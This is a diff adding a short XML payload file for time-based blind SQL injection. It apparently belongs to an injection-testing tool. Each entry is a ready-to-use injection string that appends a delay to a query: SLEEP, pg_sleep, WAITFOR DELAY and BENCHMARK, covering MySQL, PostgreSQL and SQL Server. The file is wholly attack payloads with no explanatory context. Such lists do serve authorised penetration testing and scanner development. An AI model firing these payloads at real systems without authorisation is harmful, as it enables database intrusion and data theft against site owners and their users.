@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<payloads>
+    <technique name="time">
+        <payload>%s' AND SLEEP(5)-- -</payload>
+        <payload>%s' AND pg_sleep(5)-- -</payload>
+        <payload>%s'; WAITFOR DELAY '0:0:5'-- -</payload>
+        <payload>%s' AND BENCHMARK(5000000,MD5('A'))-- -</payload>
+    </technique>
+</payloads>
